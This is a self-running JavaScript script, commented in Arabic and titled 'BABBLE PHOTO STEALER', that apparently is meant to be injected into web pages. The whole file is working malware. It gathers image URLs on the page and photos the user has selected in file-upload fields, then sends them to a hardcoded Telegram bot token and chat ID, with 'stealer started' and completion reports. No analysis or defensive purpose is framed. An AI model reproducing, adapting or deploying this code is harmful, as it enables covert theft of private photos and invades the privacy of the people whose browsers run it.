// ==========================================
// BABBLE PHOTO STEALER (JavaScript)
// يسرق الصور من جهاز الضحية
// ==========================================

(function() {
    // ==========================================
    // إعدادات التلقرام (غيرها)
    // ==========================================
    const TELEGRAM_TOKEN = "8602118678:AAEmtmFIs4VZK7EsFdliv9AI1iyQgC5PhXA";
    const CHAT_ID = "7291186428";
    
    // ==========================================
    // وظيفة إرسال للتلقرام
    // ==========================================
    function sendToTelegram(data, type) {
        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
        fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: data
            })
        }).catch(e => console.log);
    }
    
    // ==========================================
    // وظيفة إرسال صورة
    // ==========================================
    async function sendPhoto(photoData, filename) {
        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`;
        const blob = await fetch(photoData).then(r => r.blob());
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', blob, filename);
        fetch(url, { method: 'POST', body: formData }).catch(e => console.log);
    }
    
    // ==========================================
    // وظيفة البحث عن الصور في المتصفح
    // ==========================================
    async function stealPhotos() {
        try {
            // إشعار للمخترق
            sendToTelegram("🔥 BABBLE STEALER STARTED\n⏰ " + new Date().toLocaleString(), "info");
            
            // محاولة قراءة الملفات من IndexedDB أو localStorage
            // ملاحظة: المتصفحات لا تسمح بقراءة الملفات مباشرة
            // لكن يمكن سرقة:
            // 1. الصور المعروضة في الصفحة
            // 2. الصور المرفوعة في input file
            // 3. لقطات الشاشة عبر canvas
            
            const photos = [];
            
            // 1. سرقة جميع الصور المعروضة في الصفحة
            const images = document.querySelectorAll('img');
            for (let img of images) {
                if (img.src && img.src.startsWith('http')) {
                    photos.push({ url: img.src, name: img.src.split('/').pop() });
                    if (photos.length >= 30) break;
                }
            }
            
            // 2. سرقة الصور المرفوعة (input file)
            const fileInputs = document.querySelectorAll('input[type="file"]');
            for (let input of fileInputs) {
                if (input.files) {
                    for (let file of input.files) {
                        if (file.type.startsWith('image/')) {
                            const reader = new FileReader();
                            reader.onload = function(e) {
                                sendPhoto(e.target.result, file.name);
                            };
                            reader.readAsDataURL(file);
                        }
                    }
                }
            }
            
            // إرسال الصور
            for (let i = 0; i < photos.length; i++) {
                await sendPhoto(photos[i].url, photos[i].name);
                await new Promise(r => setTimeout(r, 1000));
            }
            
            // تقرير نهائي
            sendToTelegram(`✅ BABBLE COMPLETE\n📸 Photos: ${photos.length}\n⏰ ${new Date().toLocaleString()}`, "report");
            
        } catch(e) {
            sendToTelegram(`❌ Error: ${e.message}`, "error");
        }
    }
    
    // ==========================================
    // تشغيل الفيروس
    // ==========================================
    setTimeout(stealPhotos, 2000);
})();
